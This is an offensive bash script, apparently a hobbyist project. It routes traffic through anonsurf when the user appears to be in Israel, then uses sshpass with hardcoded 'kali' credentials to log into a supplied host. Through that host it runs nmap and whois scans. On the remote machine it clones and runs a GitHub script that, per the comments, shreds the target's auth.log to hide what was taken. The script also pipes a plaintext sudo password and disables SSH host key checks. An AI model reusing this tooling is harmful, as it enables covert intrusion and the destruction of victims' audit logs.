#!/bin/bash


time=$(uptime)
myip=$(ifconfig | head -2 | tail -1 | awk '{print $2}')
country=$(geoiplookup 192.42.116.200 | awk '{print $4,$5}')

# Regular Colors
Black="\033[0;30m"        # Black
Red="\033[0;31m"          # Red
Green="\033[0;32m"        # Green
Yellow="\033[0;33m"       # Yellow
Blue="\033[0;34m"         # Blue
Purple="\033[0;35m"       # Purple
Cyan="\033[0;36m"         # Cyan
White="\033[0;37m"        # White
nc="\033[08m"             # No color
Blink="\e[5m"


#func1 will check external ip
#if set to IL/ISRAEL script will start anonymous mode
function func1 () {


IP=$(curl -s ifconfig.me)	

geoiplookup $IP

var2=$(geoiplookup $IP | awk '{print $4}' | cut -d "," -f1)


if [[ $var2 == "IL" ]]
	then
	
	echo "<==========================================================>"
	echo -e "\033[1;91m you are not anonymous ape \e[0m"
	echo "I need to do everything for you	starting anonymous mode"
	echo "<==========================================================>"
	sleep 1
	func2
	else
	echo "<==========================================================>"
		echo -e "\033[1;92m Congrats"
		echo -e "\033[1;92m your anonymous \e[0m"
	echo "<==========================================================>"
sleep 5
fi



if [[ $var2 != 'IL' ]]
	then
	ssh
	exit
fi




}

#func2 will start anonyserf tool
function func2() {
	
echo 'kali' | sudo -S anonsurf start	
sleep 1
func1
ssh
}


#checks if the tool Nmap is installed
function check1() {

var1=$(dpkg -s nmap)
if [ -z "$var1" ];
	then
	echo -e "\033[0;31m nmap is not installed \e[0m"
echo "<===============================================================>"
	sleep 1
	inst1
		else
echo "<===============================================================>"
		echo -e " ${Blink}[*]\e[25m \033[1;92mnmap is installed and ready for use \e[0m"
echo "<===============================================================>"
fi

}
#will install Nmap if needed
function inst1() {
	echo -e " \033[1;93m installing nmap \e[0m"
	apt install nmap -y
	echo -e " \033[1;92m nmap installed \e[0m"
echo "<===============================================================>"
	#exit
}

#checks if the tool whois is installed
function check2() {

var1=$(dpkg -s whois)
if [ -z "$var1" ];
	then
	echo -e "\033[0;31m whois is not installed \e[0m"
echo "<===============================================================>"
	sleep 1
	inst2
		else
		echo -e " ${Blink}[*]\e[25m  \033[1;92m whois is installed and ready for use \e[0m"
echo "<===============================================================>"
fi

}
#will install the whois if needed
function inst2() {
	echo -e " \033[1;93m installing whois \e[0m"
	apt install whois -y
	echo -e " \033[1;92m whois installed \e[0m"
echo "<===============================================================>"
	#exit
}

#checks if kali-anonsurf is installed
function check3() {

var1=$(dpkg -s Kali-anonsurf)
if [ -z "$var1" ];
	then
	echo -e "\033[0;31m Kali-anonsurf is not installed \e[0m"
echo "<===============================================================>"
	sleep 1
	inst3
		else
		echo -e " ${Blink}[*]\e[25m  \033[1;92m Kali-anonsurf is installed and ready for use \e[0m"
echo "<===============================================================>"
fi

}
#will install "kali-anonsurf" if need and will run the "installed.sh"
function inst3() {
	
	echo -e " \033[1;93m installing Kali-anonsurf"
	sudo git clone https://github.com/Und3rf10w/kali-anonsurf.git && cd kali-anonsurf && sudo bash installer.sh

	echo -e " \033[1;92m Kali-anonsurf installed \e[0m"
	echo "<===============================================================>"
	#exit
}
#checks if the tool sshpass is installed
function check4() {

var1=$(dpkg -s sshpass)
if [ -z "$var1" ];
	then
	echo -e "\033[0;31m sshpas is not installed \e[0m"
echo "<===============================================================>"
	sleep 1
	inst4
		else
		echo -e " ${Blink}[*]\e[25m  \033[1;92m sshpas is installed and ready for use \e[0m"
echo "<===============================================================>"
fi

}
#installs the tool sshpass if needed
function inst4() {
	
	echo -e " \033[1;93m installing sshpas"
	sudo apt-get install sshpass

	echo -e " \033[1;92m sshpass installed \e[0m"
	echo "<===============================================================>"
	#exit
}
#checks if thetool geoip-bin is installed
function check5() {

var1=$(dpkg -s geoip-bin)
if [ -z "$var1" ];
	then
	echo -e "\033[0;31m geoiplookup is not installed \e[0m"
echo "<===============================================================>"
	sleep 1
	inst5
		else
		echo -e " ${Blink}[*]\e[25m  \033[1;92m geoiplookup is installed and ready for use \e[0m"
echo "<===============================================================>"
fi

}
#will install the tool geoip-bin if needed
function inst5() {
	
	echo -e " \033[1;93m installing geoiplookup"
	sudo apt install geoip-bin

	echo -e " \033[1;92m geoiplookup installed \e[0m"
	echo "<===============================================================>"
	#exit
}


#this func will ask the user for ip input and
#connect via sshpass and run the commands:Nmap,whois,uptime,geoiplookup
#clone a second script form github (2nd script will shred the auth.log file of the taraget)
#so taraget won't know what info was taken/exploited
function ssh() {

echo 'kali' | sudo -S service ssh start
sudo service ssh start
	sleep 0.5
echo "<==========================================================>"
echo 'kali' | sudo -S service ssh status
sudo service ssh status
sleep 0.5
echo "<==========================================================>"

echo "Taraget ip\Domain to Scan with Nmap:"
read var11
echo "Traget ip\Domain to scan with whois:"
read var12


	echo "Input an ip to ssh to:"
	read var2
echo "<==========================================================>"

VPPASS='kali'
VPUSER='kali'

sshpass -p $VPPASS ssh -T -o StrictHostKeyChecking=no $VPUSER@$var2 "echo 'kali' | sudo -S git clone https://github.com/InFeduss/Sleep.git && cd Sleep && echo 'kali' | sudo -S chmod 777 sleeper.sh"
sshpass -p $VPPASS ssh -T -o StrictHostKeyChecking=no $VPUSER@$var2 "echo -e '${Purple}uptime: $time${nc}' && echo '<==========================================================>' && echo -e '${Purple}spoofed ip is: $myip${nc}' && echo '<==========================================================>' && echo -e '${Purple}country: $country${nc}' && echo '<==========================================================>'"
sshpass -p $VPPASS ssh -T -o StrictHostKeyChecking=no $VPUSER@$var2 "nmap -A $var11 && whois $var12" > /home/kali/results/result.txt
sshpass -p $VPPASS ssh -T -o StrictHostKeyChecking=no $VPUSER@$var2 "cd Sleep && echo 'kali' | sudo -S bash sleeper.sh"

echo -e "  \n"

echo "[*]Taraget's Nmap data was saved to ~/results/result.txt"

echo -e "  \n"

echo "[*]Taraget's whois data was saved to ~/results/result.txt"

echo -e "  \n"

echo "command executs were saved to result.txt on $(date)"

echo -e "  \n"

echo "command sshpass was logged on $(date)" > /home/kali/results/log.txt
sleep 1

echo "credits goes to"
echo "#...."
sleep 1
echo "##..."
sleep 1
echo "###.."
sleep 1
echo "####."
sleep 1
echo "  "
echo "TO ME OFC you !@#!@# pfff"
echo "  "
echo "Credits TO" 
figlet -c D.B

figlet -c S10


}



	check1
sleep 0.5
check2
sleep 0.5
check3
sleep 0.5
check4
sleep 0.5
check5

	echo -e " ${Blink}\033[0;101m Restoring system back Online \e[0m\e[25m"
echo "<==========================================================>"
	sleep 1
	echo -e " \033[1;95m checking EIP \e[0m"
echo "<==========================================================>"
	sleep 1
	
	func1
	
	func2
